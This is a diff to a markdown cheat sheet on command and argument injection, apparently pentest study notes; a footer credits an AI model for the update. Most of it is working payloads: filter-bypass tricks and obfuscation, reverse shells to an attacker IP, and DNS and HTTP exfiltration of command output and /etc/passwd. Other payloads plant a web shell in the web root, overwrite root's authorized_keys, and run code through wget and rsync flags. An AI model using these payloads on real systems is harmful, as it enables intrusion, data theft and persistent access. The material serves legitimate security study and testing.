@@ -8,10 +8,14 @@ User-controlled input is passed unsanitized to a system shell call. The injected
 
 | Language | Dangerous Functions |
 |---|---|
-| PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen` |
-| Node.js | `child_process.exec`, `child_process.spawn` |
-| Python | `os.system`, `os.popen`, `subprocess.call/run/Popen` (**with `shell=True`**), `eval`/`exec` |
-| C# / .NET | `Process.Start`, `ProcessStartInfo` |
+| PHP | `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, backticks |
+| Node.js | `child_process.exec`/`execSync`; `spawn`/`execFile` **only with `{shell: true}`** |
+| Python | `os.system`, `os.popen`, `subprocess.call/run/Popen` (**with `shell=True`**), `eval`/`exec` (code injection) |
+| Ruby | backticks, `%x()`, `system`/`exec` with a **single string**, `Kernel#open("\|cmd")`, `IO.popen` |
+| Perl | backticks, `system`/`exec` with one string, 2-arg `open` with a `\|` |
+| Java | `Runtime.exec`/`ProcessBuilder` — **no shell**, splits on whitespace → argument injection only, unless the code runs `sh -c`/`cmd /c` |
+| Go | `exec.Command` — no shell; dangerous only as `exec.Command("sh", "-c", userString)` |
+| C# / .NET | `Process.Start`, `ProcessStartInfo` — exploitable when `FileName` is `cmd.exe`/`powershell` with concatenated `Arguments` |
 
 ### Recognising the sink in source code (the real signal)
 
@@ -65,9 +69,11 @@ $out = shell_exec("nslookup " . $_GET['host']); // passthru / exec / popen / pro
 $out = `nslookup {$_GET['host']}`;              // backticks == shell_exec
 
 // ⚠ escapeshellcmd() — escapes ; | & $ ` etc. but NOT argument injection
-system("ping -c 4 " . escapeshellcmd($_GET['host']));
-//   host = "-f 10.10.10.10"  → injects a flag (flood ping); no separator needed.
+system("curl " . escapeshellcmd($_GET['url']));
+//   url = "http://10.10.14.5:8001/s.php -o /var/www/html/s.php"  → injects a flag; no separator needed.
 //   escapeshellcmd neutralises COMMAND CHAINING, not attacker-controlled OPTIONS.
+//   (It also leaves PAIRED quotes alone, and escapeshellarg()+escapeshellcmd() on the same
+//    string re-opens a quote — the PHPMailer CVE-2016-10033/10045 sendmail -X chain.)
 
 // ✅ escapeshellarg() — wraps the value in '...' as ONE argv element
 system("ping -c 4 " . escapeshellarg($_GET['host']));
@@ -123,6 +129,8 @@ execFile('nslookup', [req.query.host], (e, out) => res.send(out));
 | Sub-Shell | ` `` ` | `%60%60` | Both — Linux only |
 | Sub-Shell | `$()` | `%24%28%29` | Both — Linux only |
 
+> [!warning] **Windows `cmd.exe` doesn't chain on `;` or a newline.** It treats `;` as an argument delimiter, like a space, so use `&`, `&&`, `||` or `|`. PowerShell does accept `;`. On Linux, `%0a` is often the one operator a blacklist forgets, so try it early.
+
 ---
 
 ## Detection
@@ -136,7 +144,7 @@ Inject a command after the target parameter — if output appears in the respons
 127.0.0.1; whoami
 127.0.0.1 && whoami
 127.0.0.1 | whoami
-127.0.0.1 || whoami
+x || whoami          # || only fires if the FIRST command fails — a valid IP makes it silent
 127.0.0.1`whoami`
 127.0.0.1$(whoami)
 ```
@@ -151,12 +159,12 @@ No output returned. Inject a delay and measure response time:
 127.0.0.1 && sleep 5
 127.0.0.1 | sleep 5
 
-# Windows
-127.0.0.1& timeout /t 5
-127.0.0.1& ping -n 5 127.0.0.1
+# Windows — ping -n N waits ~N-1 seconds (one per gap between echoes)
+127.0.0.1& ping -n 6 127.0.0.1
+127.0.0.1& powershell -c "Start-Sleep 5"
 ```
 
-> [!note] If the response takes ~5 seconds longer → blind CI confirmed
+> [!note] If the response takes ~5 seconds longer → blind CI confirmed. Avoid `timeout /t 5` on Windows: when stdin is redirected (as it is under a web app) it exits immediately with *"Input redirection is not supported"*, which looks like a negative result.
 
 ### Blind — OOB (out-of-band)
 
@@ -173,12 +181,16 @@ Trigger a DNS or HTTP callback to a controlled server. Use Burp Collaborator or 
 # Data appears as the leftmost DNS label in your collaborator log
 # e.g. nslookup www-data.abc123.oast.fun → you see "www-data" in DNS query
 
-# Exfil multi-word output (replace spaces with dashes)
-127.0.0.1; nslookup $(id | tr ' ' '-').<collaborator-url>
+# Exfil arbitrary output — DNS labels allow only [a-z0-9-] and max 63 chars,
+# so hex-encode and truncate (id's "(", ")", "=", "," would break a raw label)
+127.0.0.1; nslookup $(id | xxd -p | head -c 60).<collaborator-url>
+# longer output: send it in 60-char chunks, one lookup per chunk
+127.0.0.1; id | xxd -p | tr -d '\n' | fold -w 60 | while read c; do nslookup $c.<collaborator-url>; done
 
-# Linux — HTTP with data exfil
+# Linux — HTTP with data exfil (URL-safe base64, no line wraps)
 127.0.0.1; curl http://<collaborator-url>/$(whoami)
-127.0.0.1; wget -q -O- http://<collaborator-url>/$(id | base64)
+127.0.0.1; wget -q -O- http://<collaborator-url>/$(id | base64 -w0 | tr '+/' '-_')
+127.0.0.1; curl -s --data-binary @/etc/passwd http://<collaborator-url>/     # whole file in a POST body
 
 # Windows — DNS
 127.0.0.1& nslookup <collaborator-url>
@@ -221,7 +233,7 @@ ls${IFS}-la${IFS}/
 | Payload | Returns |
 |---|---|
 | `${PATH:0:1}` | `/` |
-| `${LS_COLORS:10:1}` | `;` |
+| `${LS_COLORS:10:1}` | `;` — **only if LS_COLORS is set**; it usually isn't in a web server's environment, so check `printenv` first |
 | `$(tr '!-}' '"-~'<<<[)` | `\` (char shift) |
 | `$(tr '!-}' '"-~'<<<:)` | `;` (char shift) |
 | `printenv` | List all env vars — find useful chars |
@@ -233,43 +245,45 @@ ls${IFS}-la${IFS}/
 
 ### Globbing (Linux) — Path/Command Obfuscation
 
-Shell glob expansion resolves wildcards before execution — avoids typing command names or paths literally:
+The shell expands a glob into **every** matching path, sorted alphabetically, before it runs anything. **The first match becomes the command, and every other match becomes an argument.** A glob only works as a command-name bypass if it matches **exactly one** file on the target. Expansions below were checked on Kali; other distros have different binaries:
 
 ```bash
-# ? matches exactly one character
-/???/??t /etc/passwd       # /bin/cat (or /usr/cut etc.) — avoids writing "cat"
-/bin/c?t /etc/passwd       # matches cat, cut
-/usr/bin/who??i            # matches whoami
+# ✅ unique matches — these work
+/usr/bin/who??i            # → /usr/bin/whoami only
+/???/bin/bas? -c 'id'      # → /usr/bin/bash only
 
-# * matches any number of characters
-/bin/ca* /etc/passwd       # matches cat
-/usr/bin/who*              # matches whoami, whoever, etc.
+# ❌ ambiguous — the FIRST alphabetical match runs, the rest become its arguments
+/???/??t /etc/passwd       # → /bin/ant /bin/apt /bin/cat ... → runs ANT
+/bin/c?t /etc/passwd       # → cat cct cut cvt → runs cat but also dumps 3 binaries
+/bin/ca*  /usr/bin/who*    # → cachepic... / who whoami whois → wrong binary
+/usr/bin/i?  /bin/l?       # → id ip / ld ln lp ls → may run ld, not ls
 
-# Useful when the keyword itself is filtered:
-# "cat" blocked → /???/??t /etc/passwd
-# "id" blocked → /usr/bin/i?
-# "ls" blocked → /bin/l?
+# Tighten the pattern until it's unique — mix literal chars with ? / [..]
+/usr/bin/[c]at /etc/passwd   # bracket class — "cat" never appears literally
+/usr/bin/l[s] -la
 
-# Works in argument injection too — bypass path filters
-/???/bin/bas? -c 'id'      # /usr/bin/bash -c 'id'
+# Preview the expansion before you send it (on your box, or via a verbose sink):
+echo /usr/bin/who??i
 ```
+
+> [!tip] Glob ambiguity is target-specific. A pattern that's unique on a slim Docker image can match five binaries on a full Kali. If you can see output, `echo <pattern>` first.
 
 ### Character Tricks (Windows)
 
 | Payload | Returns |
 |---|---|
-| `%HOMEPATH:~0,-17%` | `\` (CMD) |
-| `%HOMEPATH:~6,-11%` | `\` (CMD) |
+| `%HOMEPATH:~0,1%` | `\` (CMD) — always works: HOMEPATH starts with `\` |
+| `%HOMEPATH:~0,-17%` / `%HOMEPATH:~6,-11%` | `\` — **HTB's forms; the offsets only fit the user `htb-student`** (`\Users\htb-student`). Recount for any other username |
 | `$env:HOMEPATH[0]` | `\` (PowerShell) |
 | `Get-ChildItem Env:` | All env vars |
 | `%COMSPEC%` | Full path to `cmd.exe` — bypass if `cmd` keyword is filtered |
 
 ```cmd
-# %COMSPEC% as cmd.exe alias
+:: %COMSPEC% as cmd.exe alias
 %COMSPEC% /c whoami
 %COMSPEC% /c "net user"
 
-# Useful if filter blocks the word "cmd" but not environment variable expansion
+:: Useful if filter blocks the word "cmd" but not environment variable expansion
 ```
 
 ### Best-Fit / "WorstFit" (Windows Unicode → ANSI)
@@ -284,6 +298,7 @@ When a Windows app takes a Unicode string but calls the ANSI (`*A`) Win32 API, u
 | `＼` fullwidth reverse solidus | `U+FF3C` | `\` |
 | `＞` fullwidth greater-than | `U+FF1E` | `>` |
 | `｜` fullwidth vertical line | `U+FF5C` | `\|` |
+| `＆` fullwidth ampersand | `U+FF06` | `&` |
 | `Ｙ` fullwidth Y | `U+FF39` | `Y` |
 
 ```
@@ -317,8 +332,10 @@ w\ho\am\i         # → whoami
 
 ```bash
 $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")          # → whoami
-$(a="WhOaMi";printf %s "${a,,}")           # → whoami
+$(a="WhOaMi";printf %s "${a,,}")           # → whoami   (bash 4+ only)
 ```
+
+> [!note] **These tricks need bash, not `/bin/sh`.** `<<<` here-strings, `${a,,}`, `${VAR:x:y}` substrings and brace expansion are all bashisms. Dash (`/bin/sh` on Debian/Ubuntu) rejects them, so wrap the payload in `bash -c '...'` when the sink uses `sh -c` (PHP `system`, Python `shell=True`, Node `exec`). `${IFS}` and `$()` work in dash too. **On macOS**, `/bin/sh` runs bash **3.2**: here-strings and substrings work, but `${a,,}` doesn't (bash 4+), so use `tr`. The default *login* shell there is zsh, which isn't what web sinks run.
 
 **Reversed commands**:
 
@@ -337,7 +354,7 @@ echo -n 'cat /etc/passwd' | base64         # → Y2F0IC9ldGMvcGFzc3dk
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
 
 # With quote obfuscation on the decoder
-b'a's'h'<<<$('b'a's'e'6'4' -d<<<Y2F0IC9ldGMvcGFzc3dk)
+b'a's'h'<<<$('b'a's'e'6'4 -d<<<Y2F0IC9ldGMvcGFzc3dk)   # quote count must be even — a stray trailing ' = "unexpected EOF"
 ```
 
 **Hex decoding**:
@@ -358,7 +375,7 @@ $(base64 -d<<<bHM=)      # → runs ls
 
 ### Windows
 
-**Caret insertion** (CMD only — caret is a continuation char):
+**Caret insertion** (CMD only — `^` is CMD's escape char; escaping an ordinary letter just yields the letter):
 
 ```cmd
 who^ami    → whoami
@@ -404,14 +421,15 @@ nc -lvnp 9001
 ### Linux reverse shells
 
 ```bash
-# bash
-bash -i >& /dev/tcp/10.10.14.5/9001 0>&1
+# bash — most sinks run your input under /bin/sh (dash on Debian/Ubuntu), which rejects the
+# bash-only ">&" and /dev/tcp syntax ("Bad fd number"), so wrap it in bash -c
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'
 
-# URL-encoded version (for injection in URL params)
-bash%20-i%20>%26%20/dev/tcp/10.10.14.5/9001%200>%261
+# URL-encoded version (for injection in URL params) — same bash -c wrapper
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/9001%200%3E%261%27
 
-# via /dev/tcp without bash -i
-0<&196;exec 196<>/dev/tcp/10.10.14.5/9001; sh <&196 >&196 2>&196
+# via /dev/tcp without bash -i — /dev/tcp is still a bash feature, so this needs bash too
+bash -c '0<&196;exec 196<>/dev/tcp/10.10.14.5/9001; sh <&196 >&196 2>&196'
 
 # python
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
@@ -433,6 +451,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 nc.exe -e cmd.exe 10.10.14.5 9001
 ```
 
+> Upgrading the shell to a full TTY, plus more shell variants: [[Shells & Payloads]].
+
 ---
 
 ## Automated Testing — commix
@@ -453,7 +473,7 @@ commix -r request.txt
 
 # Force technique — letters: c=classic e=eval t=time-based f=file-based
 commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=t    # time-based
-commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=f    # file-based OOB
+commix --url "http://target.com/ping.php?ip=127.0.0.1" --technique=f    # file-based (semi-blind: writes output to a web-readable file, then fetches it)
 
 # Run a single command / drop to the interactive pseudo-shell (auto after detection)
 commix --url "http://target.com/ping.php?ip=127.0.0.1" --os-cmd="id"
@@ -468,8 +488,10 @@ commix --url "http://target.com/ping.php?ip=127.0.0.1" --os-cmd="id"
 git clone https://github.com/Bashfuscator/Bashfuscator
 cd Bashfuscator && pip3 install -e .
 
-bashfuscator -c 'cat /etc/passwd'                    # random technique
-bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling -m random   # minimal
+bashfuscator -c 'cat /etc/passwd'                    # random mutators (output can be huge)
+bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1   # smallest payload
+bashfuscator -c 'id' -q --test                       # -q payload only; --test runs it locally to prove it works
+# --choose-mutators picks specific ones by hand; -l lists them
 
 # Invoke-DOSfuscation (Windows PowerShell)
 Import-Module .\Invoke-DOSfuscation.psd1
@@ -493,7 +515,7 @@ Map the filter systematically before burning time on complex bypasses.
    ; id    ; uname    ; echo test
 
 3. Test whitespace — is space blocked?
-   ;${IFS}id    ;%09id    ;{id}
+   ;${IFS}id    ;%09id    ;{ls,-la}     (braces need a comma — {id} alone is NOT expanded)
 
 4. Test slashes — is / blocked?
    ;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
@@ -547,12 +569,12 @@ printf '%s\n' /var/www/html/*
 
 | Blocked | Alternatives |
 |---|---|
-| `whoami` | `id` `id -un` `echo $USER` `echo $USERNAME` |
-| `hostname` | `uname -n` `cat /etc/hostname` |
+| `whoami` | `id` `id -un` — `$USER` is often **unset** under a web server (systemd/Apache don't export it) |
+| `hostname` | `uname -n` `cat /etc/hostname` `cat /proc/sys/kernel/hostname` |
 | `uname` | `cat /proc/version` `cat /etc/os-release` |
-| `ifconfig` | `ip a` `ip addr` `cat /proc/net/if_inet6` |
-| `netstat` | `ss -tlnp` `cat /proc/net/tcp` |
-| `ps` | `ls /proc/*/exe` `cat /proc/*/cmdline` |
+| `ifconfig` | `ip a` `hostname -I` `cat /proc/net/fib_trie` (IPv4) `cat /proc/net/if_inet6` (IPv6) |
+| `netstat` | `ss -tlnp` `cat /proc/net/tcp` (hex addr:port) |
+| `ps` | `ls -l /proc/*/exe` `tr '\0' ' ' </proc/<pid>/cmdline` (cmdline is NUL-separated) |
 
 ### Network / data exfil
 
@@ -618,9 +640,11 @@ http://attacker.com/shell.php -O /var/www/html/shell.php
 # --post-file to exfil a local file
 http://attacker.com/ --post-file=/etc/passwd
 
-# --use-askpass= runs the given binary — straight to RCE, no operators needed
+# --use-askpass= runs the given binary at startup (wget ≥1.20) — straight to RCE, no operators needed
 http://attacker.com/ --use-askpass=/tmp/payload.sh
-# pair with -O to stage the payload first if you get two fetches
+# it's spawned directly (no sh, no extra args — only the prompt text as argv[1]), so the
+# file must already be executable with a #! line. A file staged with -O lands WITHOUT +x,
+# so you need a second primitive (chmod, an upload that keeps modes) to make it runnable.
 
 # -O to an authorized_keys / cron path when running privileged
 http://attacker.com/key.pub -O /root/.ssh/authorized_keys
@@ -631,31 +655,39 @@ http://attacker.com/key.pub -O /root/.ssh/authorized_keys
 ### ImageMagick / convert argument injection
 
 ```bash
-# Read arbitrary file and send to attacker (SSRF)
+# Fetch a remote image and -write a copy into the web root (file write — the image must
+# carry PHP, e.g. in an EXIF comment, for the copy to execute)
 http://attacker.com/img.jpg -write /var/www/html/shell.php
 
-# Or via label: scheme (reads file content as text)
+# Or via label: scheme (reads file content as text into the image)
 label:@/etc/passwd output.png
+# NB: many distro policy.xml files block "@" file reads (path "@*" rights="none") — check before relying on it
 ```
 
 ### ffmpeg argument injection
 
 ```bash
-# Read local file via concat: protocol
-concat:/etc/passwd
-
-# SSRF — fetch internal resource and encode in output
+# SSRF — ffmpeg fetches any http(s) input. It's blind (text isn't decodable media),
+# so confirm with an OOB callback / timing rather than expecting the body back
 http://169.254.169.254/latest/meta-data/
+
+# File overwrite — inject -y + an extra output path (writes where the app user can write)
+input.mp4 -y /var/www/html/x.mp4
 ```
+
+> [!note] `concat:/etc/passwd` doesn't leak the file. ffmpeg tries to decode it as media and fails with *"Invalid data found when processing input"*. The real ffmpeg local-file-read is the **HLS playlist trick**: an uploaded `.m3u8`/`.avi` whose playlist references `file:///etc/passwd`, so the file content gets rendered into the transcoded video. That's an upload bug, not argument injection — see [[File Upload Attacks]].
 
 ### rsync argument injection
 
 ```bash
-# -e flag to inject shell command as the remote shell
--e 'sh -c "id>/tmp/pwned"'
+# -e sets the "remote shell" — rsync only runs it when a host:path operand is present,
+# so inject a fake remote spec too (verified on rsync 3.5.0: no host: → nothing runs)
+-e 'sh -c "id>/tmp/pwned"' x:/dev/null
 ```
 
 > [!note] Argument injection often bypasses command injection filters because no operator characters are needed — the injected content looks like a URL or flag.
+
+> [!warning] **Injecting *extra* arguments needs word splitting.** A space in your input only creates a new argv element if the value lands **unquoted** in a shell string, if `escapeshellcmd` was used, or if a no-shell API splits on whitespace (Java `Runtime.exec(String)`). If the value arrives as **one** argv element (`escapeshellarg`, a Python/Node arg list), you only control that single argument. That still works when the value *starts with* `-` (`--use-askpass=...`, `-K/tmp/x`), so try a one-token flag. If the app prefixes `--` before your value, flags are dead too.
 
 ---
 
@@ -687,9 +719,10 @@ $()
 | Goal | Payload |
 |---|---|
 | Test verbose | `; whoami` `&& id` `\| id` |
-| Test blind (time) | `; sleep 5` `& timeout /t 5` |
+| Test blind (time) | `; sleep 5` `& ping -n 6 127.0.0.1` |
 | Test blind (OOB) | `; curl http://<collab>/$(whoami)` |
 | Space bypass (Linux) | `${IFS}` `%09` `{cmd,-arg}` |
+| Keyword bypass via glob | `/usr/bin/who??i` — must match **one** file (`echo` it first) |
 | Slash bypass (Linux) | `${PATH:0:1}` |
 | Quote bypass (Linux) | `w'ho'ami` `w\ho\am\i` |
 | Case bypass (Linux) | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
@@ -711,5 +744,5 @@ $()
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-09-18*
-*Model: claude-opus-4-8*
+*Updated: 2026-10-08*
+*Model: claude-opus-5-5*
